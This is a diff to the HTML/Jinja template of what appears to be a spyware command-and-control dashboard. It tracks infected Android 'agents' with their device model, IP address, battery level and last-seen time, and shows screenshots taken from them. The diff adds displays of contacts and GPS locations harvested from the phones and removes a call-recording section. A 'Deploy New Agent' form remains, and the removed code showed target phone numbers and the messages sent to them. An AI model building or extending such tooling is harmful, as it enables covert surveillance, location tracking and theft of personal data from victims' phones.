@@ -41,6 +41,16 @@
         .debug-info a { color: #4CAF50; text-decoration: none; margin: 0 10px; }
         .debug-info a:hover { text-decoration: underline; }
         
+        /* Data Items */
+        .contact-item, .location-item { 
+            background: #3d3d3d; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 8px; 
+        }
+        .contact-item { border-left: 4px solid #4CAF50; }
+        .location-item { border-left: 4px solid #FF9800; }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .stats { grid-template-columns: 1fr 1fr; }
@@ -75,7 +85,7 @@
         Active Agents: {{ stats.active_agents }} | 
         Total Agents: {{ all_agents|length }} |
         <a href="/debug/agents">View All Agents</a> |
-        <a href="/test/register_agent">Test Registration</a>
+        <a href="/admin">Admin Panel</a>
     </div>
 
     <div class="stats">
@@ -88,12 +98,12 @@
             <div>Screenshots</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" style="color: var(--warning);">{{ stats.total_calls }}</div>
-            <div>Call Records</div>
+            <div class="stat-number" style="color: #4CAF50;">{{ stats.total_contacts }}</div>
+            <div>Contacts</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" style="color: var(--secondary);">{{ stats.total_deployments }}</div>
-            <div>Deployments</div>
+            <div class="stat-number" style="color: #FF9800;">{{ stats.total_locations }}</div>
+            <div>Locations</div>
         </div>
     </div>
 
@@ -107,12 +117,20 @@
                 <p><strong>Model:</strong> {{ agent.phone_model or 'Unknown' }}</p>
                 <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
                 <p><strong>Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
-                <p><strong>Calls:</strong> {{ agent.call_records or 0 }}</p>
                 <p><strong>IP:</strong> {{ agent.ip_address or 'Unknown' }}</p>
                 <p><strong>Status:</strong> 
                     <span style="color: {% if agent.status == 'active' %}#4CAF50{% else %}#ff4444{% endif %};">
                         {{ agent.status|upper }}
                     </span>
+                </p>
+                <p><strong>Battery:</strong> 
+                    {% if agent.battery_level %}
+                        {% if agent.battery_level > 70 %}🟢
+                        {% elif agent.battery_level > 30 %}🟡
+                        {% else %}🔴
+                        {% endif %}
+                        {{ agent.battery_level }}%
+                    {% else %}Unknown{% endif %}
                 </p>
             </div>
             {% endfor %}
@@ -125,7 +143,7 @@
             <div style="margin-top: 20px;">
                 <strong>All Registered Agents:</strong>
                 {% for agent in all_agents %}
-                <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px;">
+                <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px; border-left: 4px solid {% if agent.status == 'active' %}#4CAF50{% else %}#ff4444{% endif %};">
                     {{ agent.agent_id }} - {{ agent.status }} - Last: {{ agent.last_seen or 'Never' }}
                 </div>
                 {% endfor %}
@@ -142,7 +160,8 @@
             {% for screenshot in screenshots %}
             <div class="screenshot-item">
                 <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
-                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Screenshot" class="screenshot-img">
+                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Screenshot" class="screenshot-img"
+                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>Image not available</div>'">
                 </a>
                 <div style="margin-top: 10px;">
                     <strong>{{ screenshot.agent_id }}</strong><br>
@@ -158,6 +177,40 @@
     </div>
 
     <div class="section">
+        <h2>👥 Recent Contacts</h2>
+        {% if contacts %}
+        <div>
+            {% for contact in contacts %}
+            <div class="contact-item">
+                <strong>{{ contact.contact_name }}</strong><br>
+                <span style="color: #4CAF50;">📞 {{ contact.phone_number }}</span><br>
+                <small>Agent: {{ contact.agent_id }} | {{ contact.timestamp }}</small>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No contacts collected yet</p>
+        {% endif %}
+    </div>
+
+    <div class="section">
+        <h2>📍 Recent Locations</h2>
+        {% if locations %}
+        <div>
+            {% for location in locations %}
+            <div class="location-item">
+                <strong>📍 {{ location.address or 'Unknown Location' }}</strong><br>
+                <span>Lat: {{ "%.6f"|format(location.latitude) }}, Lng: {{ "%.6f"|format(location.longitude) }}</span><br>
+                <small>Agent: {{ location.agent_id }} | {{ location.timestamp }}</small>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No locations collected yet</p>
+        {% endif %}
+    </div>
+
+    <div class="section">
         <h2>🚀 Deploy New Agent</h2>
         <div class="deploy-form">
             <form action="/deploy" method="post">
@@ -167,44 +220,35 @@
             </form>
         </div>
         
-        <h3 style="margin-top: 30px;">Recent Deployments</h3>
-        {% if deployments %}
-            {% for deployment in deployments %}
-            <div style="background: #3d3d3d; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid var(--warning);">
-                <strong>Target:</strong> {{ deployment.target_phone }} | 
-                <strong>Status:</strong> {{ deployment.status }}<br>
-                <strong>Time:</strong> {{ deployment.timestamp }}<br>
-                <strong>Message:</strong> <em>{{ deployment.message_sent[:80] }}...</em>
+        <h3 style="margin-top: 30px;">Registered Agents</h3>
+        {% if all_agents %}
+            {% for agent in all_agents %}
+            <div style="background: #3d3d3d; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid {% if agent.status == 'active' %}#4CAF50{% else %}#ff4444{% endif %};">
+                <strong>Agent ID:</strong> {{ agent.agent_id }} | 
+                <strong>Status:</strong> {{ agent.status }}<br>
+                <strong>First Seen:</strong> {{ agent.first_seen or 'Never' }} | 
+                <strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}<br>
+                <strong>Device:</strong> {{ agent.phone_model or 'Unknown' }} - {{ agent.android_version or 'Unknown' }}
             </div>
             {% endfor %}
         {% else %}
-            <p style="text-align: center; padding: 20px; color: #888;">No deployments yet</p>
-        {% endif %}
-    </div>
-
-    <div class="section">
-        <h2>📞 Recent Call Records</h2>
-        {% if calls %}
-            {% for call in calls %}
-            <div style="background: #3d3d3d; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid var(--primary);">
-                <strong>Agent:</strong> {{ call.agent_id }} | 
-                <strong>Type:</strong> {{ call.call_type }} | 
-                <strong>Number:</strong> {{ call.phone_number }}<br>
-                <strong>Duration:</strong> {{ call.duration }} seconds | 
-                <strong>Time:</strong> {{ call.timestamp }}<br>
-                {% if call.audio_data %}
-                <a href="/media/call/{{ call.id }}" style="color: var(--primary); text-decoration: none;">🔗 Download Recording</a>
-                {% endif %}
-            </div>
-            {% endfor %}
-        {% else %}
-            <p style="text-align: center; padding: 20px; color: #888;">No call records yet</p>
+            <p style="text-align: center; padding: 20px; color: #888;">No agents registered yet</p>
         {% endif %}
     </div>
 
     <script>
         // Auto-refresh every 15 seconds
         setTimeout(() => window.location.reload(), 15000);
+        
+        // Update agent status colors
+        document.querySelectorAll('.agent-card').forEach(card => {
+            const statusElement = card.querySelector('span');
+            if (statusElement && statusElement.textContent.includes('ACTIVE')) {
+                card.style.borderLeftColor = '#4CAF50';
+            } else {
+                card.style.borderLeftColor = '#f44336';
+            }
+        });
     </script>
 </body>
 </html>
